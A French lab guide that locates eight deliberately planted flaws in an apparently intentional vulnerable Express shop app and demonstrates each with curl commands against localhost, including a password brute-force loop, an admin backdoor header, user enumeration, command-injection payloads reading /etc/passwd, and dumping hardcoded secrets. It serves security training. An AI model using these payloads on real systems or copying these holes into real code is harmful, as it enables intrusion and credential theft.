# 🔍 LOCALISATION DES VULNÉRABILITÉS - Ligne par Ligne

**Où trouver chaque faille dans le code**

---

## 📄 FICHIERS CONTENANT LES VULNÉRABILITÉS

| Fichier | Failles | Description |
|---------|---------|-------------|
| [server.js](server.js) | 1-8 | Backend Express - Toutes les vulnérabilités |
| [.env](.env) | 2, 4, 7 | Secrets hardcodés exposés |
| [public/login.html](public/login.html) | Aucune | Interface de login sécurisée (client-side) |
| [public/dashboard.html](public/dashboard.html) | Aucune | Dashboard sécurisé (client-side) |

---

## 🚨 DÉTAIL PAR FAILLE

---

### 1️⃣ FAILLE 1: No Input Validation (SQL Injection Simulation)

**Fichier:** `server.js`

**Lignes:**
```
Ligne 71-85: app.post('/api/register', ...)
Ligne 74: Validation minimale
Ligne 83: Password pas de hachage
```

**Code vulnérable:**
```javascript
// Ligne 71
app.post('/api/register', (req, res) => {
  const { username, email, password } = req.body;

  // FAILLE 1: Pas de validation (pourrait faire SQL injection en production)
  if (!username || !email || !password) {
    return res.json({ success: false, error: 'Missing fields' });
  }
```

**Points clés:**
- Pas de regex validation
- Pas de longueur minimum
- Pas d'échappement (vulnérable en SQL réel)

**Exploitation:**
```bash
curl -X POST http://localhost:3000/api/register \
  -H "Content-Type: application/json" \
  -d '{"username":"","email":"test@","password":""}'
```

---

### 2️⃣ FAILLE 2: Plain Text Passwords

**Fichier:** `server.js` et `.env`

**Lignes server.js:**
```
Ligne 83-86: Stockage du password en clair
```

**Code vulnérable:**
```javascript
// Ligne 83-86
const newUser = {
  id: users.length + 1,
  username,
  email,
  password  // FAILLE 2: Plain text password!
};
```

**Fichier .env:**
```
Ligne 2: DB_PASSWORD=password123
```

**Data initiale (Ligne 31-32):**
```javascript
let users = [
  { id: 1, username: 'user', email: 'user@sneakers.com', password: 'user123' },
  { id: 2, username: 'admin', email: 'admin@sneakers.com', password: 'admin' }
];
```

**Impact:**
- Si la BD fuite, tous les passwords visibles
- Démonstration de l'impact en accessing `/api/user/2`

---

### 3️⃣ FAILLE 3: No Rate Limiting on Login

**Fichier:** `server.js`

**Lignes:**
```
Ligne 33: let loginAttempts = {}; // Déclaré mais JAMAIS utilisé
Ligne 100: app.post('/api/login', ...) - Pas de vérification
```

**Code vulnérable:**
```javascript
// Ligne 33
let loginAttempts = {}; // FAILLE: Pas de rate limiting

// Ligne 100
app.post('/api/login', (req, res) => {
  const { email, password } = req.body;
  const clientIp = req.ip;

  // FAILLE 3: Pas de rate limiting
  // Quelqu'un peut bruteforce les passwords
```

**Exploitation:**
```bash
# Tenter 100 fois rapidement - tout passe!
for i in {1..100}; do
  curl -s -X POST http://localhost:3000/api/login \
    -H "Content-Type: application/json" \
    -d '{"email":"admin@sneakers.com","password":"try'$i'"}'
done
```

---

### 4️⃣ FAILLE 4: Admin Bypass Token

**Fichier:** `server.js` et `.env`

**Lignes server.js:**
```
Ligne 112-117: Vérification du header x-admin-token
```

**Code vulnérable:**
```javascript
// Ligne 112-117
// FAILLE 4: Pas de "admin bypass"... attendez
// Vérifier si admin token
if (req.headers['x-admin-token'] === process.env.ADMIN_TOKEN) {
  // FAILLE 4: Backdoor admin!
  req.session.userId = 1;
  req.session.username = 'admin_bypass';
  return res.json({ success: true, message: 'Admin access granted' });
}
```

**Fichier .env:**
```
Ligne 4: ADMIN_TOKEN=admin_token_12345
```

**Exploitation:**
```bash
curl -X POST http://localhost:3000/api/login \
  -H "X-Admin-Token: admin_token_12345" \
  -H "Content-Type: application/json" \
  -d '{"email":"anyone@example.com","password":"anything"}'
```

---

### 5️⃣ FAILLE 5: Unsafe Session Cookies

**Fichier:** `server.js`

**Lignes:**
```
Ligne 18-25: Configuration de session
Ligne 21-22: Paramètres non-sécurisés
```

**Code vulnérable:**
```javascript
// Ligne 18-25
app.use(session({
  secret: process.env.SESSION_SECRET,
  resave: false,
  saveUninitialized: true,
  cookie: { 
    secure: false,      // FAILLE 5a: secure=false même sans HTTPS
    httpOnly: false     // FAILLE 5b: httpOnly=false, accessible from JavaScript!
  }
}));
```

**Exploitation - Browser Console:**
```javascript
// Ouvrir DevTools → Console sur http://localhost:3000
document.cookie
// Voir le connect.sid en clair!
```

**Exploitation - Theft:**
```bash
# Quelqu'un peut voler le cookie et le réutiliser
curl -b "connect.sid=STOLEN_COOKIE" http://localhost:3000/api/shoes
```

---

### 6️⃣ FAILLE 6: Information Disclosure

**Fichier:** `server.js`

**Lignes:**
```
Ligne 123-127: Messages d'erreur révélateurs
```

**Code vulnérable:**
```javascript
// Ligne 123-127
if (!user) {
  // FAILLE 6: Information disclosure - révéler si user existe
  const userExists = users.find(u => u.email === email);
  return res.json({ 
    success: false, 
    error: userExists ? 'Wrong password' : 'User not found'  // FAILLE 6!
  });
}
```

**Exploitation - Énumération:**
```bash
# Test 1: Email existe
curl -s -X POST http://localhost:3000/api/login \
  -H "Content-Type: application/json" \
  -d '{"email":"admin@sneakers.com","password":"wrong"}' | jq '.error'
# Retourne: "Wrong password" → User existe!

# Test 2: Email n'existe pas
curl -s -X POST http://localhost:3000/api/login \
  -H "Content-Type: application/json" \
  -d '{"email":"fake@example.com","password":"anything"}' | jq '.error'
# Retourne: "User not found" → User n'existe pas
```

---

### 7️⃣ FAILLE 7: BFLA (Broken Function Level Access Control)

**Fichier:** `server.js`

**Lignes:**
```
Ligne 165-178: app.get('/api/user/:id', ...) - Pas de vérification d'autorisation
Ligne 174: Retourne le password!
```

**Code vulnérable:**
```javascript
// Ligne 165-178
app.get('/api/user/:id', isLoggedIn, (req, res) => {
  const userId = parseInt(req.params.id);
  
  // FAILLE 3: Pas de vérification que c'est SON propre profil
  // N'importe quel user peut voir les infos d'un autre user
  
  const user = users.find(u => u.id === userId);
  
  if (!user) {
    return res.json({ success: false, error: 'User not found' });
  }

  res.json({ 
    success: true, 
    user: user  // Retourne password et tout!
  });
});
```

**Aussi Ligne 151-162:** `app.get('/api/user/profile', ...)`
```javascript
// Ligne 151-162
res.json({ 
  success: true, 
  user: user  // Password inclus!
});
```

**Exploitation:**
```bash
# 1. Login comme user normal
curl -c cookies.txt -X POST http://localhost:3000/api/login \
  -H "Content-Type: application/json" \
  -d '{"email":"user@sneakers.com","password":"user123"}'

# 2. Voir le profil de l'admin (id=2)
curl -b cookies.txt http://localhost:3000/api/user/2

# RÉSULTAT:
# {
#   "id": 2,
#   "username": "admin",
#   "email": "admin@sneakers.com",
#   "password": "admin"   ← HACKED!
# }
```

---

### 8️⃣ FAILLE 8: Command Injection

**Fichier:** `server.js`

**Lignes:**
```
Ligne 1-4: Imports du module exec
Ligne 199-207: Utilisation vulnérable
Ligne 206: shell: true (DANGEREUX!)
```

**Code vulnérable:**
```javascript
// Ligne 1-4 (Top du fichier)
const { exec } = require('child_process');

// Ligne 192-207 (Dans /api/shoes/search)
app.get('/api/shoes/search', isLoggedIn, (req, res) => {
  const { q } = req.query;

  // ... filter code ...

  // FAILLE 8: Executer une commande basée sur l'input
  // Quelqu'un a pensé: "Je vais loger la recherche"
  const logCommand = `echo "Search: ${q}" >> /tmp/shoe_search.log`;
  
  // FAILLE 8: shell=true! 
  exec(logCommand, { shell: true }, (err) => {
    if (err) console.error('Log error:', err.message);
  });
```

**Exploitation:**
```bash
# 1. D'abord, avoir les cookies
curl -c cookies.txt -X POST http://localhost:3000/api/login \
  -H "Content-Type: application/json" \
  -d '{"email":"user@sneakers.com","password":"user123"}'

# 2. Injection: Créer un fichier
curl "http://localhost:3000/api/shoes/search?q=Nike;%20touch%20/tmp/pwned;%20echo" \
  -b cookies.txt

# 3. Vérifier
ls /tmp/pwned
# FILE CREATED! ✅

# 4. Plus dangereux: Lire /etc/passwd
curl "http://localhost:3000/api/shoes/search?q=test;%20cat%20/etc/passwd%20>%20/tmp/passwd.txt;%20echo" \
  -b cookies.txt

cat /tmp/passwd.txt
# Voir le contenu de /etc/passwd!
```

---

### 🎁 BONUS: Debug Config Exposed

**Fichier:** `server.js`

**Lignes:**
```
Ligne 209-226: app.get('/api/config', ...)
```

**Code vulnérable:**
```javascript
// Ligne 209-226
app.get('/api/config', (req, res) => {
  // FAILLE: Pas d'authentification
  // Quelqu'un a créé ça pour tester
  
  if (process.env.DEBUG) {
    res.json({
      debug: true,
      environment: process.env.NODE_ENV,
      sessionSecret: process.env.SESSION_SECRET,  // FAILLE: Exposed!
      adminToken: process.env.ADMIN_TOKEN,        // FAILLE: Exposed!
      apiKey: process.env.API_KEY,                // FAILLE: Exposed!
      users_count: users.length,
      version: '1.0.0'
    });
  }
});
```

**Fichier .env:**
```
Ligne 1: SESSION_SECRET=my_super_secret_key_shared_on_slack_2024
Ligne 2: DB_PASSWORD=password123
Ligne 3: ADMIN_TOKEN=admin_token_12345
Ligne 4: API_KEY=sk_test_12345678
Ligne 5: DEBUG=true
```

**Exploitation:**
```bash
curl http://localhost:3000/api/config

# RETOUR:
# {
#   "debug": true,
#   "environment": "development",
#   "sessionSecret": "my_super_secret_key_shared_on_slack_2024",
#   "adminToken": "admin_token_12345",
#   "apiKey": "sk_test_12345678",
#   "users_count": 2,
#   "version": "1.0.0"
# }
```

---

### 🔒 BONUS 2: HTTPS verify=false

**Fichier:** `server.js`

**Lignes:**
```
Ligne 269-280: app.get('/api/external-data', ...)
Ligne 274: rejectUnauthorized: false
```

**Code vulnérable:**
```javascript
// Ligne 269-280
app.get('/api/external-data', isLoggedIn, async (req, res) => {
  try {
    // Simulation - en prod ce serait une vraie requête HTTPS
    const response = await axios.get('https://api.example.com/data', {
      httpsAgent: {
        rejectUnauthorized: false  // FAILLE 5: MITM vulnerable!
      },
      timeout: 3000
    });
```

**Impact:**
- MITM (Man-In-The-Middle) possible
- Pas de vérification du certificat SSL
- Quelqu'un peut intercepter la connection

---

## 📊 RÉSUMÉ - LOCALISATION RAPIDE

```
server.js
├── Ligne 1-4 ................. FAILLE 8 - Imports exec
├── Ligne 18-25 ............... FAILLE 5 - Unsafe session cookies
├── Ligne 31-32 ............... FAILLE 2 - Initial users plain text
├── Ligne 33 .................. FAILLE 3 - loginAttempts unused
├── Ligne 71-85 ............... FAILLE 1 - No validation (register)
├── Ligne 83-86 ............... FAILLE 2 - Plain text password storage
├── Ligne 100-127 ............. FAILLE 3 - No rate limiting (login)
├── Ligne 112-117 ............. FAILLE 4 - Admin bypass token
├── Ligne 123-127 ............. FAILLE 6 - Info disclosure
├── Ligne 151-162 ............. FAILLE 7 - BFLA (profile endpoint)
├── Ligne 165-178 ............. FAILLE 7 - BFLA (user/:id endpoint)
├── Ligne 192-207 ............. FAILLE 8 - Command injection
├── Ligne 209-226 ............. BONUS - Debug config exposed
└── Ligne 269-280 ............. BONUS - HTTPS verify=false

.env
├── Ligne 1 ................... FAILLE 7 - SESSION_SECRET exposed
├── Ligne 2 ................... FAILLE 2 - DB_PASSWORD exposed
├── Ligne 3 ................... FAILLE 4 - ADMIN_TOKEN exposed
├── Ligne 4 ................... BONUS - API_KEY exposed
└── Ligne 5 ................... BONUS - DEBUG=true enabled
```

---

## 🎯 COMMANDES POUR VÉRIFIER CHAQUE FAILLE

```bash
# FAILLE 1: Validation faible
curl -X POST http://localhost:3000/api/register \
  -H "Content-Type: application/json" \
  -d '{"username":"","email":"","password":""}'

# FAILLE 2: Passwords en clair
# Vérifier dans server.js ligne 83-86 et .env ligne 2

# FAILLE 3: Brute force (10 tentatives rapides)
for i in {1..10}; do curl -s -X POST http://localhost:3000/api/login \
  -H "Content-Type: application/json" \
  -d '{"email":"admin@sneakers.com","password":"try'$i'"}'; echo ""; done

# FAILLE 4: Admin bypass
curl -X POST http://localhost:3000/api/login \
  -H "X-Admin-Token: admin_token_12345" \
  -H "Content-Type: application/json" \
  -d '{"email":"anyone@example.com","password":"anything"}'

# FAILLE 5: Cookies non-sécurisés
# Vérifier dans browser DevTools: document.cookie

# FAILLE 6: Énumération
curl -s -X POST http://localhost:3000/api/login \
  -H "Content-Type: application/json" \
  -d '{"email":"admin@sneakers.com","password":"wrong"}' | jq '.error'

# FAILLE 7: BFLA
curl -c cookies.txt -X POST http://localhost:3000/api/login \
  -H "Content-Type: application/json" \
  -d '{"email":"user@sneakers.com","password":"user123"}'
curl -b cookies.txt http://localhost:3000/api/user/2

# FAILLE 8: Command injection
curl "http://localhost:3000/api/shoes/search?q=Nike;%20touch%20/tmp/pwned;%20echo" \
  -b cookies.txt && ls /tmp/pwned

# BONUS: Config exposed
curl http://localhost:3000/api/config
```

---

**Toutes les failles sont dans `server.js` et `.env` ✅**
